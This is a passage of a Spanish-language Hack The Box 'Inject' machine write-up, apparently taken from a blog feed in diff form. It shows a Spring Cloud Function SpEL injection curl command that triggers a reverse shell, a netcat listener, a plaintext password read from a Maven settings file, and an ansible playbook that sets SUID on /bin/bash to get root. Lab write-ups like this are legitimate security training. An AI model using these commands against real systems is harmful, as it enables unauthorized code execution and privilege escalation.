-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content curl <span class="nt">-X</span> POST http://10.10.11.204:8080/functionRouter <span class="nt">-H</span> <span class="s1">'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/reverse.sh")'</span> <span class="nt">--data-raw</span> <span class="s1">'data'</span> <span class="nt">-v</span>
-Note: Unnecessary use of <span class="nt">-X</span> or <span class="nt">--request</span>, POST is already inferred.
-<span class="k">*</span>   Trying 10.10.11.204:8080...
-<span class="k">*</span> Connected to 10.10.11.204 <span class="o">(</span>10.10.11.204<span class="o">)</span> port 8080
-<span class="o">&gt;</span> POST /functionRouter HTTP/1.1
-<span class="o">&gt;</span> Host: 10.10.11.204:8080
-<span class="o">&gt;</span> User-Agent: curl/8.5.0
-<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
-<span class="o">&gt;</span> spring.cloud.function.routing-expression:T<span class="o">(</span>java.lang.Runtime<span class="o">)</span>.getRuntime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">"bash /tmp/reverse.sh"</span><span class="o">)</span>
-<span class="o">&gt;</span> Content-Length: 4
-<span class="o">&gt;</span> Content-Type: application/x-www-form-urlencoded
-<span class="o">&gt;</span>
-&lt; HTTP/1.1 500
-&lt; Content-Type: application/json
-&lt; Transfer-Encoding: chunked
-&lt; Date: Sun, 02 Jun 2024 19:00:11 GMT
-&lt; Connection: close
-&lt;
-<span class="k">*</span> Closing connection
-<span class="o">{</span><span class="s2">"timestamp"</span>:<span class="s2">"2024-06-02T19:00:11.233+00:00"</span>,<span class="s2">"status"</span>:500,<span class="s2">"error"</span>:<span class="s2">"Internal Server Error"</span>,<span class="s2">"message"</span>:<span class="s2">"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String"</span>,<span class="s2">"path"</span>:<span class="s2">"/functionRouter"</span><span class="o">}</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Recibimos la <code class="language-plaintext highlighter-rouge">shell</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ nc <span class="nt">-nlvp</span> 443
-listening on <span class="o">[</span>any] 443 ...
-connect to <span class="o">[</span>10.10.14.55] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.204] 42862
-bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>827<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
-bash: no job control <span class="k">in </span>this shell
-frank@inject:/<span class="nv">$ </span><span class="nb">whoami
-whoami
-</span>frank
-frank@inject:/<span class="err">$</span>
-</code></pre></div></div>
-
-<h2 id="shell-as-phil">Shell as phil</h2>
-
-<ul>
-  <li>Si recordamos tenemos la contraseña de <strong>phil</strong> de primeras no pudimos conectarnos por <code class="language-plaintext highlighter-rouge">ssh</code> pero si podemos migrar a ese usuario desde la <code class="language-plaintext highlighter-rouge">shell</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>frank@inject:~/.m2<span class="nv">$ </span><span class="nb">cat </span>settings.xml
-&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span>?&gt;
-&lt;settings <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://maven.apache.org/POM/4.0.0"</span> xmlns:xsi<span class="o">=</span><span class="s2">"http://www.w3.org/2001/XMLSchema-instance"</span>
-        xsi:schemaLocation<span class="o">=</span><span class="s2">"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"</span><span class="o">&gt;</span>
-  &lt;servers&gt;
-    &lt;server&gt;
-      &lt;<span class="nb">id</span><span class="o">&gt;</span>Inject&lt;/id&gt;
-      &lt;username&gt;phil&lt;/username&gt;
-      &lt;password&gt;DocPhillovestoInject123&lt;/password&gt;
-      &lt;privateKey&gt;<span class="k">${</span><span class="nv">user</span><span class="p">.home</span><span class="k">}</span>/.ssh/id_dsa&lt;/privateKey&gt;
-      &lt;filePermissions&gt;660&lt;/filePermissions&gt;
-      &lt;directoryPermissions&gt;660&lt;/directoryPermissions&gt;
-      &lt;configuration&gt;&lt;/configuration&gt;
-    &lt;/server&gt;
-  &lt;/servers&gt;
-&lt;/settings&gt;
-frank@inject:~/.m2<span class="err">$</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Funciona.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>frank@inject:~/.m2<span class="nv">$ </span>su phil
-Password:
-phil@inject:/home/frank/.m2<span class="nv">$ </span><span class="nb">id
-</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>phil<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>phil<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>phil<span class="o">)</span>,50<span class="o">(</span>staff<span class="o">)</span>
-phil@inject:/home/frank/.m2<span class="err">$</span>
-</code></pre></div></div>
-
-<h2 id="user-flag">User flag</h2>
-
-<ul>
-  <li>Podemos ver la flag.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phil@inject:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
-8dc5c8c4c03735847448fbf460738832
-phil@inject:~<span class="err">$</span>
-</code></pre></div></div>
-
-<h2 id="privilege-escalation">Privilege Escalation</h2>
-
-<ul>
-  <li>Al no encontrar nada interesante decidí ejecutar <code class="language-plaintext highlighter-rouge">pspy64</code> para ver tareas <code class="language-plaintext highlighter-rouge">cron</code> y encontré esta, corre <code class="language-plaintext highlighter-rouge">ansible-parallel</code> <a href="https://pypi.org/project/ansible-parallel/">https://pypi.org/project/ansible-parallel/</a>.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/easy/inject/escalada.png" />
-</p>
-
-<ul>
-  <li>Allí vemos la estructura del <code class="language-plaintext highlighter-rouge">.yml</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phil@inject:/opt/automation<span class="nv">$ </span><span class="nb">cd </span>tasks/
-phil@inject:/opt/automation/tasks<span class="nv">$ </span><span class="nb">ls
-</span>playbook_1.yml
-phil@inject:/opt/automation/tasks<span class="nv">$ </span><span class="nb">cat </span>playbook_1.yml
-- hosts: localhost
-  tasks:
-  - name: Checking webapp service
-    ansible.builtin.systemd:
-      name: webapp
-      enabled: <span class="nb">yes
-      </span>state: started
-phil@inject:/opt/automation/tasks<span class="err">$</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Vemos que el directorio <code class="language-plaintext highlighter-rouge">tasks</code> corresponde al grupo staff y nosotros estamos allí y podemos escribir.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phil@inject:/opt/automation/tasks<span class="nv">$ </span><span class="nb">id
-</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>phil<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>phil<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>phil<span class="o">)</span>,50<span class="o">(</span>staff<span class="o">)</span>
-phil@inject:/opt/automation/tasks<span class="nv">$ </span><span class="nb">cd</span> ..
-phil@inject:/opt/automation<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
-total 4
-drwxrwxr-x 2 root staff 4096 Jun  2 19:26 tasks
-</code></pre></div></div>
-
-<ul>
-  <li>Como es una tarea cron lo que vamos hacer es asignarle privilegios <code class="language-plaintext highlighter-rouge">SUID</code> ala <code class="language-plaintext highlighter-rouge">bash</code> usando el modulo <code class="language-plaintext highlighter-rouge">ansible.builtin.shell</code> <a href="https://docs.ansible.com/ansible/latest/collections/ansible/builtin/shell_module.html">https://docs.ansible.com/ansible/latest/collections/ansible/builtin/shell_module.html</a>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phil@inject:/opt/automation/tasks<span class="nv">$ </span><span class="nb">cat </span>playbook_2.yml
-- hosts: localhost
-  tasks:
-    - name: SUID
-      ansible.builtin.shell: |
-        <span class="nb">chmod</span> +s /bin/bash
-      become: <span class="nb">true
-</span>phil@inject:/opt/automation/tasks<span class="err">$</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Vamos a esperar a que se ejecute la tarea y ver si las <code class="language-plaintext highlighter-rouge">bash</code> se le otorga el privilegio <code class="language-plaintext highlighter-rouge">SUID</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phil@inject:/opt/automation/tasks<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /bin/bash
-<span class="nt">-rwsr-sr-x</span> 1 root root 1183448 Apr 18  2022 /bin/bash
-phil@inject:/opt/automation/tasks<span class="err">$</span>
-</code></pre></div></div>
-
-<h2 id="shell-as-root">Shell as root</h2>
-
-<ul>
-  <li>Ahora ya estamos como <code class="language-plaintext highlighter-rouge">root</code> y vemos la <code class="language-plaintext highlighter-rouge">flag</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phil@inject:/opt/automation/tasks<span class="nv">$ </span>bash <span class="nt">-p</span>
-bash-5.0# <span class="nb">whoami
-</span>root
-bash-5.0# <span class="nb">cat</span> /root/root.txt
-5a756880b37d955eee4996c9ef8a0620
-bash-5.0#
-</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/easy" /><summary type="html"><![CDATA[]]></summary></entry></feed>
+</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry></feed>
